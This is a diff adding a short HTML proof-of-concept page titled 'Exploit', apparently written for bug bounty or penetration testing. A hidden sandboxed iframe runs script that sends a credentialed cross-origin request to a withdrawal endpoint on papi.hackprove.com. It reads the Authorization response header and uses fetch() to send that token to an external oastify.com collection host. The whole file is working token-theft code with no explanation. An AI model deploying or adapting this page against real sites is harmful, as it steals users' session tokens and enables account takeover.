@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exploit</title>
+</head>
+<body>
+    <iframe style="display: none;" sandbox="allow-scripts" srcdoc="
+        <script>
+            var req = new XMLHttpRequest();
+            var url = 'https://papi.hackprove.com';
+
+            req.onreadystatechange = function() {
+                if (req.readyState == XMLHttpRequest.DONE) {
+                    fetch('https://bbqqwjh44gxjck4mqve8aembc2it6i.oastify.com/log?token=' + encodeURIComponent(req.getResponseHeader('Authorization')));
+                }
+            };
+
+            req.open('GET', url + '/hacker/withdrawal/submit', true);
+            req.withCredentials = true;
+            req.send(null);
+        </script>
+    "></iframe>
+</body>
+</html>
